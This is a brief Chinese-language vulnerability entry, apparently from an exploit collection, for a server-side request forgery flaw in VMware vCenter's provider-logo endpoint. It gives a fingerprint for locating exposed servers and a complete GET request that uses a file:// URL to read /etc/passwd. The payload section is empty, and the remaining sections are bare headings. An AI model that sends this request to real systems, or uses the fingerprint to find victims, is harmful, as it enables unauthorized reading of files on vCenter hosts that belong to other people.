# VMwarevCenterprovider-logo存在SSRF漏洞

- **系统**：VMwarevCenterprovider　|　**类型**：SSRF　|　**CVE**：—
- **指纹**：`title="ID_VC_Welcome"`
- **请求**：`GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd HTTP/2.0`
- **关键头**：`sec-fetch-user: ?1`

**请求体 / payload**
```

```

**其他**
- VMware vCenter provider-logo存在SSRF漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * VMware vCenter